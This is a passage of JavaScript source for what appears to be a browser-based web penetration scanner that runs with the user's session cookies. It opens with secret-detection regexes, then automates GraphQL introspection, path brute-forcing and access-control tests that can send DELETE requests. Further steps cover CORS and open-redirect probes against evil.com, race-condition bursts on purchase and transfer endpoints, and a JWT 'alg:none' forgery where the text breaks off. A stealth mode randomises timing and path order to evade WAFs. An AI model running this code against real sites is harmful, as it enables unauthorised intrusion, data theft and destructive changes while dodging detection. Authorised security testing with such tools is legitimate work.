        {n:"Internal URL",src:"\"(?:url|endpoint|internal_url|host|backend_url|service_url)\"\\s*:\\s*\"(https?:\\/\\/(?:10\\.|172\\.(?:1[6-9]|2\\d|3[01])\\.|192\\.168\\.|localhost|127\\.0\\.)[^\"]+)\"",f:"gi",sev:"high"},
        {n:"AWS Resource",src:"arn:aws:[a-z0-9-]+:[a-z0-9-]*:\\d{12}:[a-zA-Z0-9/_.-]{5,}",f:"g",sev:"high"},
        {n:"Private Key",src:"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",f:"g",sev:"critical"},
        {n:"Hardcoded Stripe",src:"(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{20,}",f:"g",sev:"critical"},
        {n:"Hardcoded GitHub",src:"gh[ps]_[A-Za-z0-9]{36,}",f:"g",sev:"critical"},
        {n:"Hardcoded JWT",src:"eyJ[A-Za-z0-9_-]{10,}\\.eyJ[A-Za-z0-9_-]{10,}",f:"g",sev:"high"},
        {n:"AWS Access Key",src:"AKIA[0-9A-Z]{16}",f:"g",sev:"critical"},
        {n:"Google API Key",src:"AIza[A-Za-z0-9_-]{35}",f:"g",sev:"high"},
        {n:"Credit Card",src:"\\b(?:4\\d{3}|5[1-5]\\d{2}|3[47]\\d{2}|6(?:011|5\\d{2}))[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{1,4}\\b",f:"g",sev:"critical"},
        {n:"SSN Pattern",src:"\\b\\d{3}-\\d{2}-\\d{4}\\b",f:"g",sev:"critical"},
        {n:"Stack Trace",src:"at\\s+[\\w$.]+\\s*\\([^)]*:\\d+(?::\\d+)?\\)",f:"g",sev:"medium"},
        {n:"SQL Error",src:"(?:SQLSTATE|mysql_|pg_|ORA-\\d{5}|syntax error.*SQL|near \".*\": syntax)",f:"gi",sev:"high"},
        {n:"Admin Flag",src:"\"(?:is_admin|isAdmin|is_superuser|is_staff)\"\\s*:\\s*(true|1)",f:"gi",sev:"high"},
        {n:"Role/Scope",src:"\"(?:role|roles|scope|scopes|permissions|groups)\"\\s*:\\s*\"?\\[?([^\",}\\]]{1,120})",f:"gi",sev:"medium"}
      ]
    }
  };
  // === Build the eval script — runs in page context with cookies ===
  // ctx is injected via window.__ps_ctx to avoid ALL template literal escaping issues
  const evalScript=`(async function(){
var R={graphql:null,sourceMaps:[],swagger:[],probes:[],options:[],suffixes:[],errors:[],requests:0,newEndpoints:[],bacResults:[],methodResults:[],corsResults:[],contentTypeResults:[],openRedirects:[],raceResults:[],hppResults:[],subdomains:[],graphqlFuzz:[],jwtAlgResults:[],hostHeaderResults:[],cachePoisonResults:[],idorAutoResults:[],authRemovalResults:[],csrfResults:[],grpcReflection:null,compressionResults:[],wsHijackResults:[],cachePoisonProbe:[],timingOracle:[],coopCoepBypass:[],storagePartition:[],paramDiscovery:[],sstiResults:[],xxeResults:[],crlfResults:[],versionDowngrade:[],protoPollution:[]};
try{
var ctx=window.__ps_ctx||{};
R.errors.push("ctx loaded: smUrls="+ctx.smUrls.length+" gql="+ctx.gqlPaths.length+" api="+ctx.apiPaths.length+" prefixes="+ctx.prefixes.length+" probes="+ctx.allProbes.length);

function mergeCustomHeaders(baseHeaders){
  if(!ctx.customHeaders)return baseHeaders||{};
  var ch=ctx.customHeaders;
  var hasAny=false;
  for(var k in ch){if(Object.prototype.hasOwnProperty.call(ch,k)){hasAny=true;break;}}
  if(!hasAny)return baseHeaders||{};
  var out={};
  if(baseHeaders)for(var k1 in baseHeaders){if(Object.prototype.hasOwnProperty.call(baseHeaders,k1))out[k1]=baseHeaders[k1];}
  for(var k2 in ch){if(Object.prototype.hasOwnProperty.call(ch,k2))out[k2]=ch[k2];}
  return out;
}
async function sf(url,opts,maxBody){
  R.requests++;
  try{
    var c=new AbortController();
    var t=setTimeout(function(){c.abort();},12000);
    var finalOpts=Object.assign({redirect:"follow",signal:c.signal},opts||{});
    finalOpts.headers=mergeCustomHeaders(finalOpts.headers);
    // Always include credentials so session cookies + custom Authorization are both sent
    if(!finalOpts.credentials)finalOpts.credentials="include";
    var r=await fetch(url,finalOpts);
    clearTimeout(t);
    var body="";
    var isHead=opts&&opts.method&&opts.method.toUpperCase()==="HEAD";
    if(!isHead&&(r.status<400||r.status===401||r.status===403||r.status===405)){
      var ct=r.headers.get("content-type")||"";
      if(!ct.includes("image")&&!ct.includes("video")&&!ct.includes("audio")&&!ct.includes("octet-stream")){
        try{body=await r.text();if(body.length>(maxBody||300000))body=body.substring(0,maxBody||300000);}catch(e){}
      }
    }
    return{url:url,status:r.status,ok:r.ok,ct:r.headers.get("content-type")||"",body:body,size:body.length,
      allow:r.headers.get("allow")||r.headers.get("Access-Control-Allow-Methods")||"",
      location:r.headers.get("location")||"",
      server:r.headers.get("server")||""};
  }catch(e){return{url:url,status:0,ok:false,error:e.message,body:"",ct:"",allow:"",location:"",server:""};}
}
function delay(ms){
  // v5.8: Stealth mode — add 0-80% jitter to every delay and a larger pause every 10 requests
  // to break up the probe's cadence. WAFs tend to pattern-match rapid sequential requests, so
  // even small randomization significantly reduces detection rates.
  if(ctx.stealth){
    ms=ms+Math.floor(Math.random()*(ms*0.8));
    if(R.requests>0&&R.requests%10===0)ms+=200+Math.floor(Math.random()*600);
    // v5.9: micro-jitter between individual requests (not just between steps)
    if(R.requests>0&&R.requests%3===0)ms+=Math.floor(Math.random()*150);
  }
  return new Promise(function(r){setTimeout(r,ms);});
}
// v5.9: Fisher-Yates shuffle. Used to randomize path orderings in stealth mode so scanners
// don't hit /admin, /.env, /.git, /wp-admin in that order every time — which is the #1
// signature that WAFs match on. Returns a new array; original is left alone.
function shuf(arr){
  if(!ctx.stealth||!Array.isArray(arr))return arr;
  var out=arr.slice();
  for(var i=out.length-1;i>0;i--){
    var j=Math.floor(Math.random()*(i+1));
    var tmp=out[i];out[i]=out[j];out[j]=tmp;
  }
  return out;
}
// v5.7: Helper — extract path-only URLs from a response body (/api/*, /v1/*, /graphql, etc).
// Returns a deduplicated array capped at 50 URLs per body. Filters out static assets.
function extractUrlsFromBody(body){
  if(!body||typeof body!=="string"||body.length<10)return [];
  var urls={};
  var count=0;
  var pathRe=new RegExp(ctx._re.pathExtract.src,ctx._re.pathExtract.f);
  var assetRe=new RegExp(ctx._re.assetFilter.src,ctx._re.assetFilter.f);
  var m;
  while((m=pathRe.exec(body))!==null&&count<80){
    var p=m[1];
    if(p.length<=4||p.length>=250)continue;
    if(assetRe.test(p))continue;
    var hashIdx=p.indexOf("#");
    if(hashIdx>-1)p=p.substring(0,hashIdx);
    if(!urls[p]){urls[p]=1;count++;}
  }
  return Object.keys(urls).slice(0,50);
}
// v5.7: Helper — scan a response body for secrets/PII/internals. Returns an array of findings
// so the recursive probe can bubble them up to the main Secrets tab. Each finding has
// {type, severity, value, context}. Capped at 5 per pattern to avoid flooding reports.
function scanBodyForFindings(body){
  if(!body||typeof body!=="string"||body.length<10)return [];
  var findings=[];
  // Patterns are defined in module scope and injected via ctx._re.bodyPatterns as JSON.
  // JSON.stringify preserves backslashes perfectly through the template→eval→string chain.
  // We reconstruct RegExp objects here from the serialized {src, f} pairs.
  var patterns=(ctx._re&&ctx._re.bodyPatterns||[]).map(function(p){
    return{n:p.n,re:new RegExp(p.src,p.f),sev:p.sev};
  });
  patterns.forEach(function(p){
    p.re.lastIndex=0;
    var m,cnt=0;
    while((m=p.re.exec(body))!==null&&cnt<5){
      cnt++;
      var val=(m[1]||m[0]);
      if(val.length>200)val=val.substring(0,200);
      findings.push({type:p.n,severity:p.sev,value:val});
    }
  });
  return findings;
}

R.errors.push("STEP 1: GraphQL ("+ctx.gqlPaths.length+" endpoints)");
// === 1. GRAPHQL INTROSPECTION ===
for(var gi=0;gi<ctx.gqlPaths.length;gi++){
  var gp=ctx.gqlPaths[gi];
  var gUrl=gp.startsWith("http")?gp:location.origin+gp;
  try{
    var gResp=await sf(gUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({query:"{__schema{types{name kind description fields{name type{name kind ofType{name kind}}}}}queryType{name}mutationType{name}subscriptionType{name}}"})},500000);
    if(gResp.ok&&gResp.body&&gResp.body.indexOf("__schema")>-1){
      try{
        var gData=JSON.parse(gResp.body);
        if(gData.data&&gData.data.__schema){
          var schema=gData.data.__schema;
          var types=(schema.types||[]).filter(function(t){return!t.name.startsWith("__");});
          var queries=types.filter(function(t){return t.name===(schema.queryType&&schema.queryType.name);});
          var mutations=types.filter(function(t){return t.name===(schema.mutationType&&schema.mutationType.name);});
          R.graphql={endpoint:gp,typeCount:types.length,types:types.map(function(t){return{name:t.name,kind:t.kind,fields:(t.fields||[]).map(function(f){return{name:f.name,type:f.type?f.type.name||f.type.kind:"?"};})};}).slice(0,200),queryFields:queries.length?queries[0].fields||[]:[],mutationFields:mutations.length?mutations[0].fields||[]:[],raw:gResp.body.substring(0,5000)};
          break;
        }
      }catch(e){R.errors.push("GraphQL parse: "+e.message);}
    }
  }catch(e){R.errors.push("GraphQL: "+e.message);}
}
await delay(100);

R.errors.push("STEP 2: SourceMaps ("+ctx.smUrls.length+" maps)");
// === 2. SOURCE MAP FETCH + PARSE ===
for(var si=0;si<ctx.smUrls.length&&si<20;si++){
  var smUrl=ctx.smUrls[si];
  if(!smUrl.startsWith("http"))smUrl=location.origin+smUrl;
  try{
    var smResp=await sf(smUrl,{},2000000);
    if(smResp.ok&&smResp.body&&smResp.body.indexOf("sources")>-1){
      try{
        var sm=JSON.parse(smResp.body);
        var sources=(sm.sources||[]).slice(0,500);
        var endpoints=[];
        // Grep sourcesContent for API endpoints
        if(sm.sourcesContent){
          sm.sourcesContent.forEach(function(content,idx){
            if(!content||content.length<50)return;
            var chunk=content.substring(0,200000);
            // Use indexOf-based extraction instead of regex literals (avoids template literal escaping issues)
            var apiPrefixes=["/api/","/v1/","/v2/","/v3/","/app/auth","/app/admin","/app/user","/app/dashboard","/graphql"];
            apiPrefixes.forEach(function(prefix){
              var pos=0;
              while(pos<chunk.length){
                var idx2=chunk.indexOf(prefix,pos);
                if(idx2===-1)break;
                // Find start quote
                var start=idx2;
                while(start>0&&chunk[start-1]!=='"'&&chunk[start-1]!=="'"&&chunk[start-1]!=="\`")start--;
                // Find end of path
                var end=idx2+prefix.length;
                while(end<chunk.length&&chunk[end]!=='"'&&chunk[end]!=="'"&&chunk[end]!=="\`"&&chunk[end]!==" "&&chunk[end]!=="\\n")end++;
                var path=chunk.substring(idx2,end);
                if(path.length>2&&path.length<150)endpoints.push({path:path,file:sources[idx2]||"?"});
                pos=end+1;
              }
            });
          });
        }
        R.sourceMaps.push({url:smUrl,fileCount:sources.length,sources:sources.slice(0,100),endpoints:endpoints.slice(0,200),size:smResp.size});
      }catch(e){R.errors.push("SourceMap parse "+smUrl.substring(0,50)+": "+e.message);}
    }
  }catch(e){}
  if(si%5===4)await delay(200);
}

R.errors.push("STEP 3: Swagger");
// === 3. SWAGGER/OPENAPI FETCH + PARSE ===
var swaggerTried=new Set();
var swaggerGuesses=["/swagger.json","/swagger/v1/swagger.json","/openapi.json","/openapi.yaml","/api-docs","/api-docs.json","/v1/api-docs","/v2/api-docs"];
var allSwagger=[].concat(ctx.swaggerUrls,swaggerGuesses);
for(var swi=0;swi<allSwagger.length;swi++){
  var swPath=allSwagger[swi];
  var swUrl=swPath.startsWith("http")?swPath:location.origin+swPath;
  if(swaggerTried.has(swUrl))continue;swaggerTried.add(swUrl);
  try{
    var swResp=await sf(swUrl,{},10000000);
    R.errors.push("Swagger "+swPath+": status="+swResp.status+" ok="+swResp.ok+" bodyLen="+swResp.body.length+" ct="+swResp.ct);
    if(swResp.status===200&&swResp.body.length>50){
      // Trim BOM and whitespace
      var swBody=swResp.body.trim();
      if(swBody.charCodeAt(0)===0xFEFF)swBody=swBody.substring(1);
      // Only try JSON parse if body looks like JSON
      if(swBody.charAt(0)==="{"||swBody.charAt(0)==="["){
        try{
          var spec=JSON.parse(swBody);
          if(spec.paths){
            var paths=Object.keys(spec.paths).map(function(p){
              var methods=Object.keys(spec.paths[p]).filter(function(m){return["get","post","put","patch","delete","options","head"].indexOf(m)>-1;});
              var params=[];
              methods.forEach(function(m){
                var op=spec.paths[p][m];
                if(op&&op.parameters)op.parameters.forEach(function(par){params.push({name:par.name,"in":par["in"],required:par.required||false,type:par.schema?par.schema.type||"?":"?"});});
              });
              return{path:p,methods:methods,params:params,summary:methods.map(function(m){var op=spec.paths[p][m];return op?(op.summary||op.operationId||""):"";}).filter(Boolean).join("; ")};
            });
            R.swagger.push({url:swUrl,title:spec.info?spec.info.title:"?",version:spec.info?spec.info.version:"?",basePath:spec.basePath||"",pathCount:paths.length,paths:paths.slice(0,500),servers:spec.servers||[],securitySchemes:spec.components&&spec.components.securitySchemes?Object.keys(spec.components.securitySchemes):[]});
            R.errors.push("Swagger PARSED: "+paths.length+" paths from "+swUrl.substring(0,50));
          }else{R.errors.push("Swagger no .paths in parsed JSON from "+swPath);}
        }catch(e){R.errors.push("Swagger JSON parse error from "+swPath+": "+e.message);}
      }else{R.errors.push("Swagger body not JSON (starts with: "+swBody.substring(0,20)+")");}
    }
  }catch(e){R.errors.push("Swagger fetch error "+swPath+": "+e.message);}
}
await delay(100);

R.errors.push("STEP 4: Robots+Sitemap");
// === 4. ROBOTS.TXT + SITEMAP.XML ===
try{
  var robotsResp=await sf(location.origin+"/robots.txt",{},100000);
  if(robotsResp.ok&&robotsResp.body){
    var lines=robotsResp.body.split(String.fromCharCode(10));
    var disallowed=[],sitemaps=[];
    lines.forEach(function(line){
      line=line.replace(String.fromCharCode(13),"").trim();
      if(line.toLowerCase().indexOf("disallow:")===0){var val=line.substring(9).trim();if(val)disallowed.push(val);}
      if(line.toLowerCase().indexOf("sitemap:")===0){var val2=line.substring(8).trim();if(val2)sitemaps.push(val2);}
    });
    R.probes.push({path:"/robots.txt",status:robotsResp.status,type:"robots",disallowed:disallowed,sitemaps:sitemaps});
    // Fetch sitemaps
    for(var smi=0;smi<sitemaps.length&&smi<3;smi++){
      try{var smResp2=await sf(sitemaps[smi],{},500000);
        if(smResp2.ok){
          var urls2=[];
          var locStart=0;
          while(true){
            var li=smResp2.body.indexOf("<loc>",locStart);
            if(li===-1)break;
            var le=smResp2.body.indexOf("</loc>",li);
            if(le===-1)break;
            urls2.push(smResp2.body.substring(li+5,le));
            locStart=le+6;
          }
          R.probes.push({path:sitemaps[smi],status:smResp2.status,type:"sitemap",urlCount:urls2.length,urls:urls2.slice(0,200)});
        }
      }catch(e){}
    }
  }
}catch(e){}

R.errors.push("STEP 5: Probes ("+ctx.allProbes.length+" paths)");
// === 5. WELL-KNOWN PATH PROBING ===
// Use redirect:"manual" so 302→login doesn't look like a real 200 hit
async function probe(url){
  R.requests++;
  try{
    var c=new AbortController();
    var t=setTimeout(function(){c.abort();},8000);
    var popts={method:"HEAD",redirect:"manual",signal:c.signal,credentials:"include"};
    var mh=mergeCustomHeaders(null);
    if(Object.keys(mh).length)popts.headers=mh;
    var r=await fetch(url,popts);
    clearTimeout(t);
    return{status:r.status,ct:r.headers.get("content-type")||"",location:r.headers.get("location")||""};
  }catch(e){return{status:0,error:e.message};}
}
var probeResults=[];
var shuffledProbes=shuf(ctx.allProbes);
for(var pi=0;pi<shuffledProbes.length;pi++){
  var pp=shuffledProbes[pi];
  var pUrl=location.origin+pp;
  try{
    var pResp=await probe(pUrl);
    // Skip 404, 0 (error), and 302/301 redirects to login pages
    if(pResp.status===0||pResp.status===404)continue;
    var isLoginRedirect=pResp.status>=300&&pResp.status<400&&(function(loc){var l=loc.toLowerCase();return l.indexOf("login")>-1||l.indexOf("signin")>-1||l.indexOf("auth")>-1||l.indexOf("account")>-1;})(pResp.location||"");
    if(isLoginRedirect)continue;
    // Interesting: 200, 403, 401, or non-login redirect
    var body2="";
    var interesting=pResp.status===200||pResp.status===401||pResp.status===403;
    if(interesting){
      try{var getResp=await sf(pUrl,{},50000);body2=getResp.body.substring(0,2000);}catch(e2){}
    }
    probeResults.push({path:pp,status:pResp.status,ct:pResp.ct,location:pResp.location||"",bodyPreview:body2,interesting:interesting});
  }catch(e){}
  if(pi%10===9)await delay(150);
}
R.probes=R.probes.concat(probeResults);

R.errors.push("STEP 6: OPTIONS ("+ctx.apiPaths.length+" endpoints)");
// === 6. OPTIONS ON API ENDPOINTS ===
for(var oi=0;oi<ctx.apiPaths.length;oi++){
  var oPath=ctx.apiPaths[oi];
  var oUrl=location.origin+oPath;
  try{
    var oResp=await sf(oUrl,{method:"OPTIONS"},1000);
    if(oResp.allow){R.options.push({path:oPath,status:oResp.status,allowedMethods:oResp.allow});}
    else if(oResp.status>0&&oResp.status!==404){R.options.push({path:oPath,status:oResp.status,allowedMethods:"(no Allow header)"});}
  }catch(e){}
  if(oi%10===9)await delay(100);
}

R.errors.push("STEP 7: Suffix brute ("+ctx.prefixes.length+" prefixes x "+ctx.SUFFIXES.length+" suffixes)");
// === 7. SMART SUFFIX BRUTEFORCE ===
var suffixTried=new Set();
var shuffledPrefixes=shuf(ctx.prefixes);
var shuffledSuffixes=shuf(ctx.SUFFIXES);
for(var pri=0;pri<shuffledPrefixes.length;pri++){
  var prefix=shuffledPrefixes[pri];
  for(var sui=0;sui<shuffledSuffixes.length;sui++){
    var fullPath=prefix+shuffledSuffixes[sui];
    if(suffixTried.has(fullPath))continue;suffixTried.add(fullPath);
    var sUrl=location.origin+fullPath;
    try{
      var sResp=await probe(sUrl);
      if(sResp.status===0||sResp.status===404)continue;
      var isLoginRedir=sResp.status>=300&&sResp.status<400&&(function(loc){var l=loc.toLowerCase();return l.indexOf("login")>-1||l.indexOf("signin")>-1||l.indexOf("auth")>-1||l.indexOf("account")>-1;})(sResp.location||"");
      if(isLoginRedir)continue;
      var sBody="";
      if(sResp.status===200||sResp.status===401||sResp.status===403){
        try{var sgResp=await sf(sUrl,{},10000);sBody=sgResp.body.substring(0,1000);}catch(e5){}
      }
      R.suffixes.push({path:fullPath,status:sResp.status,ct:sResp.ct,bodyPreview:sBody,fromPrefix:prefix});
    }catch(e){}
    if(sui%15===14)await delay(100);
  }
}

R.errors.push("STEP 8: BAC Auto-Test ("+ctx.bacRoutes.length+" routes)");
// === 8. BROKEN ACCESS CONTROL AUTO-TEST ===
for(var bi=0;bi<ctx.bacRoutes.length&&bi<80;bi++){
  var br=ctx.bacRoutes[bi];
  var bUrl=location.origin+br.path;
  try{
    var bMethod="GET";
    var bName=(br.path.split("/").pop()||"").toLowerCase();
    if(bName.indexOf("add")===0||bName.indexOf("create")===0||bName.indexOf("save")===0||bName.indexOf("submit")===0)bMethod="POST";
    if(bName.indexOf("update")===0||bName.indexOf("edit")===0||bName.indexOf("change")===0)bMethod="PUT";
    if(bName.indexOf("delete")===0||bName.indexOf("remove")===0||bName.indexOf("revoke")===0||bName.indexOf("deactivate")===0)bMethod="DELETE";
    if(bMethod==="DELETE"&&ctx.aggroLevel!=="full"){R.bacResults.push({path:br.path,method:bMethod,status:0,risk:br.risk,intent:br.intent,vulnerable:false,partial:false,bodyPreview:"",ct:"",skipped:"Skipped DELETE"});continue;}
    var bOpts={method:bMethod};
    if(bMethod==="POST"||bMethod==="PUT")bOpts.headers={"Content-Type":"application/json"};
    if(bMethod==="POST"||bMethod==="PUT")bOpts.body="{}";
    var bResp=await sf(bUrl,bOpts,2000);
    var bVuln=bResp.status===200||bResp.status===201||bResp.status===204;
    var bPartial=bResp.status===400||bResp.status===422||bResp.status===500;
    if(bVuln||bPartial){
      R.bacResults.push({path:br.path,method:bMethod,status:bResp.status,risk:br.risk,intent:br.intent,vulnerable:bVuln,partial:bPartial,bodyPreview:bResp.body.substring(0,300),ct:bResp.ct});
    }
  }catch(e){}
  if(bi%8===7)await delay(150);
}

R.errors.push("STEP 9: Method Tampering ("+ctx.observedApis.length+" endpoints)");
// === 9. HTTP METHOD TAMPERING ===
var tamperMethods=["GET","POST","PUT","DELETE","PATCH"];
var tamperTried=new Set();
for(var mi=0;mi<ctx.observedApis.length&&mi<40;mi++){
  var mEp=ctx.observedApis[mi];
  var mOriginal=mEp.method.toUpperCase();
  for(var mj=0;mj<tamperMethods.length;mj++){
    var tryMethod=tamperMethods[mj];
    if(tryMethod===mOriginal)continue;
    var mKey=mEp.path+":"+tryMethod;
    if(tamperTried.has(mKey))continue;tamperTried.add(mKey);
    var mUrl=location.origin+mEp.path+(mEp.query||"");
    try{
      var mOpts={method:tryMethod};
      if(tryMethod==="POST"||tryMethod==="PUT"||tryMethod==="PATCH"){mOpts.headers={"Content-Type":"application/json"};mOpts.body="{}";}
      var mResp=await sf(mUrl,mOpts,1000);
      if(mResp.status>0&&mResp.status!==404&&mResp.status!==405){
        R.methodResults.push({path:mEp.path,originalMethod:mOriginal,testedMethod:tryMethod,status:mResp.status,bodyPreview:mResp.body.substring(0,200),ct:mResp.ct,interesting:mResp.status===200||mResp.status===201});
      }
    }catch(e){}
  }
  if(mi%5===4)await delay(100);
}

R.errors.push("STEP 10: CORS Reflection ("+ctx.apiPaths.length+" endpoints)");
// === 10. CORS ORIGIN REFLECTION TEST ===
var corsOrigins=["https://evil.com","https://attacker.com","null"];
var corsTried=new Set();
for(var ci=0;ci<ctx.apiPaths.length&&ci<30;ci++){
  var cPath=ctx.apiPaths[ci];
  if(corsTried.has(cPath))continue;corsTried.add(cPath);
  var cUrl=location.origin+cPath;
  for(var co=0;co<corsOrigins.length;co++){
    try{
      R.requests++;
      var cc=new AbortController();
      var ct2=setTimeout(function(){cc.abort();},8000);
      var cResp=await fetch(cUrl,{method:"GET",headers:{"Origin":corsOrigins[co]},signal:cc.signal});
      clearTimeout(ct2);
      var acao=cResp.headers.get("access-control-allow-origin")||"";
      var acac=cResp.headers.get("access-control-allow-credentials")||"";
      if(acao){
        var reflected=acao===corsOrigins[co];
        var wildcard=acao==="*";
        var nullOrigin=acao==="null"&&corsOrigins[co]==="null";
        if(reflected||wildcard||nullOrigin||(acac==="true")){
          var severity="info";
          if(reflected&&acac==="true")severity="critical";
          else if(reflected)severity="high";
          else if(nullOrigin&&acac==="true")severity="critical";
          else if(wildcard&&acac==="true")severity="critical";
          else if(wildcard)severity="medium";
          R.corsResults.push({path:cPath,origin:corsOrigins[co],acao:acao,acac:acac,reflected:reflected,severity:severity,status:cResp.status});
          break;
        }
      }
    }catch(e){}
  }
  if(ci%8===7)await delay(100);
}

R.errors.push("STEP 11: Content-Type Confusion ("+ctx.postBodiesCtx.length+" POST endpoints)");
// === 11. CONTENT-TYPE CONFUSION ===
var ctTypes=["text/plain","application/xml","application/x-www-form-urlencoded","multipart/form-data; boundary=----PenScope"];
var ctTried=new Set();
// Test POST endpoints with wrong content types
var ctEndpoints=ctx.postBodiesCtx.length?ctx.postBodiesCtx:ctx.observedApis.filter(function(e){return e.method==="POST";}).slice(0,15);
for(var cti=0;cti<ctEndpoints.length&&cti<20;cti++){
  var ctEp=ctEndpoints[cti];
  var ctPath=ctEp.path;
  if(ctTried.has(ctPath))continue;ctTried.add(ctPath);
  var ctUrl=location.origin+ctPath;
  var ctBody=ctEp.body||"{}";
  for(var ctj=0;ctj<ctTypes.length;ctj++){
    try{
      var ctResp=await sf(ctUrl,{method:ctEp.method||"POST",headers:{"Content-Type":ctTypes[ctj]},body:ctBody},1000);
      if(ctResp.status>0&&ctResp.status!==404&&ctResp.status!==415){
        var accepted=ctResp.status===200||ctResp.status===201||ctResp.status===204;
        var serverError=ctResp.status===500;
        R.contentTypeResults.push({path:ctPath,originalCT:ctEp.contentType||"application/json",testedCT:ctTypes[ctj],status:ctResp.status,accepted:accepted,serverError:serverError,bodyPreview:ctResp.body.substring(0,200)});
        if(accepted)break;
      }
    }catch(e){}
  }
  if(cti%5===4)await delay(100);
}


R.errors.push("STEP 12: Open Redirect");
R.openRedirects=[];
var redirectParams=["redirect","redirect_uri","redirect_url","return","returnUrl","return_url","next","url","goto","continue","dest","destination","redir","callback_url","returnTo","forward"];
var redirectPayloads=["https://evil.com","//evil.com"];
var redirectEndpoints=ctx.observedApis.filter(function(e){var lp=(e.path+e.query).toLowerCase();return redirectParams.some(function(p){return lp.indexOf(p.toLowerCase())>-1;});}).slice(0,10);
for(var ori=0;ori<redirectEndpoints.length;ori++){
  var orEp=redirectEndpoints[ori];
  for(var orj=0;orj<redirectPayloads.length;orj++){
    var orPayload=redirectPayloads[orj];
    var orUrl=location.origin+orEp.path;
    var orParams=new URLSearchParams(orEp.query||"");
    var paramSet=false;
    redirectParams.forEach(function(rp){if(orParams.has(rp)){orParams.set(rp,orPayload);paramSet=true;}});
    if(!paramSet)orParams.set("redirect_uri",orPayload);
    try{
      R.requests++;
      var orc=new AbortController();
      var ort=setTimeout(function(){orc.abort();},8000);
      var orResp=await fetch(orUrl+"?"+orParams.toString(),{method:"GET",redirect:"manual",signal:orc.signal});
      clearTimeout(ort);
      var orLoc=orResp.headers.get("location")||"";
      if(orResp.status>=300&&orResp.status<400&&orLoc.indexOf("evil.com")>-1){
        R.openRedirects.push({path:orEp.path,param:paramSet?"existing":"redirect_uri",payload:orPayload,redirectTo:orLoc,status:orResp.status,severity:"high"});
        break;
      }
    }catch(e){}
  }
  if(ori%5===4)await delay(100);
}

R.errors.push("STEP 13: Race Condition");
R.raceResults=[];
if(ctx.aggroLevel==="medium"||ctx.aggroLevel==="full"){
  var raceEndpoints=ctx.postBodiesCtx.filter(function(p){var lp=p.path.toLowerCase();return lp.indexOf("redeem")>-1||lp.indexOf("transfer")>-1||lp.indexOf("purchase")>-1||lp.indexOf("claim")>-1||lp.indexOf("submit")>-1;}).slice(0,5);
  for(var ri=0;ri<raceEndpoints.length;ri++){
    var rEp=raceEndpoints[ri];
    try{
      var rPromises=[];
      for(var rp=0;rp<10;rp++){R.requests++;rPromises.push(fetch(location.origin+rEp.path,{method:"POST",headers:{"Content-Type":rEp.contentType||"application/json"},body:rEp.body||"{}",credentials:"include"}).then(function(r){return r.text().then(function(b){return{status:r.status,body:b.substring(0,300)};});}).catch(function(e){return{status:0};}));}
      var rResults=await Promise.all(rPromises);
      var rSuccess=rResults.filter(function(r){return r.status===200||r.status===201;}).length;
      var rUnique=rResults.map(function(r){return r.body||"";}).filter(function(v,i,a){return a.indexOf(v)===i;}).length;
      if(rSuccess>1||rUnique>1){R.raceResults.push({path:rEp.path,successCount:rSuccess,uniqueResponses:rUnique,severity:rSuccess>1?"high":"medium"});}
    }catch(e){}
    await delay(200);
  }
}

R.errors.push("STEP 14: HPP");
R.hppResults=[];
if(ctx.aggroLevel!=="careful"){
  var hppEndpoints=ctx.observedApis.filter(function(e){return e.query&&e.query.length>1;}).slice(0,15);
  for(var hi2=0;hi2<hppEndpoints.length;hi2++){
    var hEp=hppEndpoints[hi2];
    var hUrl=location.origin+hEp.path;
    var hParams=new URLSearchParams(hEp.query);
    var hKeys=[];hParams.forEach(function(v,k){hKeys.push(k);});
    if(!hKeys.length)continue;
    var hKey=hKeys[0];
    try{
      var hOrigResp=await sf(hUrl+hEp.query,{method:hEp.method||"GET"},2000);
      var hResp1=await sf(hUrl+hEp.query+"&"+encodeURIComponent(hKey)+"=PENSCOPE_HPP",{method:hEp.method||"GET"},2000);
      if(hResp1.status!==hOrigResp.status||hResp1.body!==hOrigResp.body){
        R.hppResults.push({path:hEp.path,param:hKey,originalStatus:hOrigResp.status,testStatus:hResp1.status,bodyDiffers:hResp1.body!==hOrigResp.body,severity:"medium"});
      }
    }catch(e){}
    if(hi2%5===4)await delay(100);
  }
}

R.errors.push("STEP 15: Subdomain Mining");
R.subdomains=[];
var subSet=new Set();
var baseDomain=location.hostname.split(".").slice(-2).join(".");
function addSub(host,source){if(!host||subSet.has(host))return;if(host.endsWith("."+baseDomain)||host===baseDomain){subSet.add(host);R.subdomains.push({host:host,source:source});}}
try{document.querySelectorAll("script[src]").forEach(function(s){try{addSub(new URL(s.src).hostname,"script");}catch(e2){}});}catch(e){}
try{document.querySelectorAll("link[href]").forEach(function(l){try{addSub(new URL(l.href).hostname,"link");}catch(e2){}});}catch(e){}
try{document.querySelectorAll("a[href]").forEach(function(a){try{addSub(new URL(a.href).hostname,"anchor");}catch(e2){}});}catch(e){}
try{performance.getEntriesByType("resource").forEach(function(e){try{addSub(new URL(e.name).hostname,"perf");}catch(e2){}});}catch(e){}

R.errors.push("STEP 16: GraphQL Fuzz");
R.graphqlFuzz=[];
if(R.graphql&&R.graphql.endpoint){
  var gqlUrl2=R.graphql.endpoint.startsWith("http")?R.graphql.endpoint:location.origin+R.graphql.endpoint;
  var fuzzFields=["usrs","admn","delet","passwrd","secrt","toekn","confg","internl","privte","accnt"];
  for(var fi2=0;fi2<fuzzFields.length;fi2++){
    try{
      var fResp=await sf(gqlUrl2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({query:"{"+fuzzFields[fi2]+"}"})},5000);
      if(fResp.body&&fResp.body.indexOf("Did you mean")>-1){R.graphqlFuzz.push({typo:fuzzFields[fi2],raw:fResp.body.substring(0,300)});}
    }catch(e){}
    if(fi2%5===4)await delay(100);
  }
}

R.errors.push("STEP 17: JWT Alg Confusion");
R.jwtAlgResults=[];
if(ctx.aggroLevel==="full"){
  var jwtTokens=[];
  try{document.cookie.split(";").forEach(function(c){var val=c.trim().split("=").slice(1).join("=");if(val&&val.indexOf("eyJ")===0&&val.indexOf(".")>-1)jwtTokens.push({value:val,source:"cookie"});});}catch(e){}
  if(jwtTokens.length>0&&ctx.apiPaths.length>0){
    try{
      var jParts=jwtTokens[0].value.split(".");
      var jHeader=JSON.parse(atob(jParts[0].replace(/-/g,"+").replace(/_/g,"/")));
      var origAlg=jHeader.alg;
      jHeader.alg="none";
      var noneHeader=btoa(JSON.stringify(jHeader)).split("=").join("").split("+").join("-").split("/").join("_");
      var noneToken=noneHeader+"."+jParts[1]+".";
